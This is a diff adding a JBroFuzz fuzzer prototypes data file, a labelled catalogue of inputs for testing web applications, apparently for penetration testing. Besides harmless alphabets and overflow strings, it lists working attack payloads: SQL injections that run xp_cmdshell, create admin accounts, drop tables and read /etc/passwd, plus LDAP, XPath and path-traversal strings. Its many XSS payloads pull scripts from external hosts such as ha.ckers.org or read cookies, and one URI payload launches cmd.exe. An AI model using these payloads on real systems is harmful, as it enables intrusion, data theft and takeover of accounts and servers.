@@ -1,0 +1,879 @@
+#
+# JBroFuzz Fuzzer Prototypes
+#
+# Copyright (C) 2009 
+# subere@uncon.org
+# Version 1.3
+#
+
+P:HTT-PMT-UPP:Uppercase HTTP Methods:8
+> HTTP Methods | Replacive Fuzzers | Uppercase Fuzzers
+GET
+POST
+HEAD
+PUT
+DELETE
+TRACE
+PROPFIND
+OPTIONS
+
+P:HTT-PMT-LOW:Lowercase HTTP Methods:8
+> HTTP Methods | Replacive Fuzzers | Lowercase Fuzzers
+get
+post
+head
+put
+delete
+trace
+propfind
+options
+
+P:INT-LOW:Lowercase Integer Overflows:12
+> Exploits | Replacive Fuzzers | Integer Overflows | Lowercase Fuzzers
+-1
+0
+0x100
+0x1000
+0x3fffffff
+0x7ffffffe
+0x7fffffff
+0x80000000
+0xfffffffe
+0xffffffff
+0x10000
+0x100000
+
+P:INT-UPP:Uppercase Integer Overflows:12
+> Exploits | Replacive Fuzzers | Integer Overflows | Uppercase Fuzzers
+-1
+0
+0x100
+0x1000
+0x3FFFFFFF
+0x7FFFFFFE
+0x7FFFFFFF
+0x80000000
+0xFFFFFFFE
+0xFFFFFFFF
+0x10000
+0x100000
+
+
+P:FSE-LOW:Lowercase Format Strings:19
+> Exploits | Replacive Fuzzers | Format String Errors | Lowercase Fuzzers
+%s%p%x%d
+.1024d
+%.2049d
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%99999999999s
+%08x
+%%20d
+%%20n
+%%20x
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+f(x)=%s x 129
+f(x)=%x x 257
+
+P:FSE-UPP:Uppercase Format Strings:2
+> Exploits | Replacive Fuzzers | Format String Errors | Uppercase Fuzzers
+%X
+f(x)=%X x 257
+
+P:SQL-INJ:SQL Injection:16
+> Replacive Fuzzers | SQL Injection | Injection
+A
+a'
+--
+@
+?
+' AND 1=0) UNION ALL
+' or 1=1
+? or 1=1 --
+x' AND userid IS NULL; --
+x' AND email IS NULL; --
+anything' OR 'x'='x
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND members.email IS NULL; --
+x' OR full_name LIKE '%Bob%
+23 OR 1=1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+
+P:SQL-ORA-CLE:Oracle SQL Injection:2
+> Replacive Fuzzers | SQL Injection | Injection
+'||UTL_HTTP.REQUEST('http://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
+
+P:SQL-SQP:Passive SQL Injection:55
+> Replacive Fuzzers | SQL Injection | Injection
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1-- 
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select 
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+@var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+
+P:SQL-SQI:Active SQL Injection:9
+> Replacive Fuzzers | SQL Injection| Injection
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+CREATE USER name IDENTIFIED BY 'pass123'
+CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; 
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
+INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+
+P:LDP-INJ:LDAP Injection:20
+> Replacive Fuzzers | LDAP Injection | Injection
+|
+!
+(
+)
+%28
+%29
+&
+%26
+%21
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+*()|%26'
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+
+P:XPT-INJ:XPATH Injection:10
+> Replacive Fuzzers | XPATH Injection | Injection
+'+or+'1'='1
+'+or+''='
+x'+or+1=1+or+'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x'+or+name()='username'+or+'x'='y
+
+P:XSS-101:XSS 101:9
+> XSS | Replacive Fuzzers
+<script>alert('XSS')</script>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+</title><script>alert(1)</script>
+'> <script>alert(3)</script>
+`> <script>alert(5)</script>
+> <script>alert(4)</script>
+</title><script>alert(1)</script>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+>"'
+
+
+P:XSS-102:XSS 102:9
+> XSS | Replacive Fuzzers
+'';!--"<XSS>=&{()}
+*/a=eval;b=alert;a(b(/e/.source));/*
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//
+</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
+perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
+
+
+P:XSS-JSC-BRK:XSS JS Breaks:11
+> XSS | Replacive Fuzzers
+alert(1)
+A=alert;A(1)
++alert(0)+
+';//%0da=eval;b=alert;a(b(9));//
+a=1;a=eval;b=alert;a(b(11));//
+'};a=eval;b=alert;a(b(13));//
+1};a=eval;b=alert;a(b(14));//
+'];a=eval;b=alert;a(b(15));//
+1];a=eval;b=alert;a(b(17));//
+1;a=eval;b=alert;a(b(/c/.source));
+xyz onerror=alert(6);
+
+P:XSS-IE4-567:XSS IE:38
+> XSS | Replacive Fuzzers
+<img src=`x` onrerror= ` ;; alert(1) ` />
+</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+style=color: expression(alert(0));" a="
+vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<DIV STYLE="width: expression(alert('XSS'));">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>
+<IMG DYNSRC="javascript:alert('XSS');">
+<IMG LOWSRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMGSRC="javascript:alert('XSS')">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+
+P:XSS-GEK:XSS Gecko:11
+> XSS | Replacive Fuzzers
+(1?(1?{a:1?""[1?"ev\a\l":0](1?"\a\lert":0):0}:0).a:0)[1?"\c\a\l\l":0](content,1?"x\s\s":0)
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http://ha.ckers.org@google">XSS</A>
+<A HREF="//google">XSS</A>
+<IFRAME SRC=http://ha.ckers.org/scriptlet.html <
+y=<a>alert</a>;content[y](123)
+sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+with(document.__parent__)alert(1)
+style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+
+P:XSS-STL-INJ:XSS Style Injection:14
+> XSS | Replacive Fuzzers
+style=color: expression(alert(0));" a="
+style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+P:XSS-HTM-BRK:XSS HTML Breaking:7
+> XSS | Replacive Fuzzers
+<s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}");}
+'';!--"<script>alert(0);</script>=&{(alert(1))}
+</title><script>alert(1)</script>
+</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+'';!--"<XSS>=&{()}
+
+P:XSS-EMB-EVD:XSS Embed/Evade:10
+> XSS | Replacive Fuzzers
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+
+P:XSS-IMG:XSS IMG Tag:10
+> XSS | Replacive Fuzzers
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">",
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+
+P:XSS-NET:ASP .NET ValidateRequest:5
+> XSS | Replacive Fuzzers
+</XSS STYLE=xss:expression(alert('XSS'))>
+XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS-STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+"><script>alert('XSS')</script>
+
+P:XSS-XML:XSS XML Injection:6
+> XSS | XML Injection | Replacive Fuzzers | Injection
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
+
+P:XSS-URI:URI XSS:4
+> XSS | URI Exploits | Replacive Fuzzers
+aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+
+P:XSS-JSN:JSON:5
+> XSS | Replacive Fuzzers
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
+<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
+<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
+<body/????$/onload=x={doc:parent[’document’]};x.doc.writeln(1)
+
+P:XSS-SSI:Server Side Includes:2
+> XSS | Replacive Fuzzers | Web Server
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<!--#exec cmd=""/usr/X11R6/bin/xterm –display 127.0.0.1:0 &""-->
+
+P:PTH-SMP:Sample Files:2
+> Web Server | Replacive Fuzzers
+/../.. /../../../boot.ini
+/../../../../../winnt/repair/setup.log
+
+P:XSS-URL-BRK:URL Breaking:3
+> XSS | Replacive Fuzzers
+http://aa"><script>alert(123)</script>
+http://aa'><script>alert(123)</script>
+http://aa<script>alert(123)</script>
+
+R:NUM-HEX-LOW:Base16 (Hex) Lowercase:16
+> Number Systems | Base | Recursive Fuzzers | Lowercase Fuzzers
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+a
+b
+c
+d
+e
+f
+
+R:NUM-HEX-UPP:Base16 (Hex) Uppercase:16
+> Number Systems | Base | Recursive Fuzzers | Uppercase Fuzzers 
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+A
+B
+C
+D
+E
+F
+
+R:B10-DEC:Base10 (Decimal) Alphabet:10
+> Number Systems | Base | Recursive Fuzzers
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+R:B08-OCT:Base08 (Octal) Alphabet:8
+> Number Systems | Base | Recursive Fuzzers
+0
+1
+2
+3
+4
+5
+6
+7
+
+R:B02-BIN:Base02 (Binary) Alphabet:2
+> Number Systems | Base | Recursive Fuzzers
+0
+1
+
+R:ALP-NUM-LOW:Alpha-Numeric Lowercase:36
+> Alphabets | Recursive Fuzzers | Lowercase Fuzzers
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+R:ALP-NUM-UPP:Alpha-Numeric Uppercase:36
+> Alphabets | Recursive Fuzzers | Uppercase Fuzzers
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+R:ALP-UPP:Alpha Uppercase:26
+> Alphabets | Recursive Fuzzers | Uppercase Fuzzers
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+
+R:ALP-LOW:Alpha Lowercase:26
+> Alphabets | Recursive Fuzzers | Lowercase Fuzzers
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+
+R:B64-RFC:Base64 Alphabet:64
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
++
+/
+=
+
+R:B64-URL:Base64 (URL/File Safe) Alphabet:64
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+-
+_
+=
+
+R:B32-RFC:Base32 Alphabet:32
+> Alphabets | Number Systems | Base | Recursive Fuzzers | Uppercase Fuzzers
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+2
+3
+4
+5
+6
+7
+=
+
+R:B32-HEX:Base32 (Extended Hex) Alphabet:32
+> Alphabets | Number Systems | Base | Recursive Fuzzers | Uppercase Fuzzers
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+=
+
+P:BFO-UPP:Long Uppercase AAA's:17
+> Exploits | Buffer Overflows | Uppercase Fuzzers
+A
+f(x)=A x 3
+f(x)=A x 5
+f(x)=A x 9
+f(x)=A x 17
+f(x)=A x 33
+f(x)=A x 65
+f(x)=A x 129
+f(x)=A x 257
+f(x)=A x 513
+f(x)=A x 1025
+f(x)=A x 2049
+f(x)=A x 4197
+f(x)=A x 8193
+f(x)=A x 16385
+f(x)=A x 32769
+f(x)=A x 65537
+
+P:BFO-LOW:Long Lowercase aaa's:17
+> Exploits | Buffer Overflows | Lowercase Fuzzers
+a
+f(x)=a x 3
+f(x)=a x 5
+f(x)=a x 9
+f(x)=a x 17
+f(x)=a x 33
+f(x)=a x 65
+f(x)=a x 129
+f(x)=a x 257
+f(x)=a x 513
+f(x)=a x 1025
+f(x)=a x 2049
+f(x)=a x 4197
+f(x)=a x 8193
+f(x)=a x 16385
+f(x)=a x 32769
+f(x)=a x 65537
+
+R:DNA-UPP:DNA Uppercase Fuzzer:4
+> Biology | Recursive Fuzzers | Uppercase Fuzzers
+A
+T
+C
+G
+
+R:DNA-LOW:DNA Lowercase Fuzzer:4
+> Biology | 
+a
+t
+c
+g
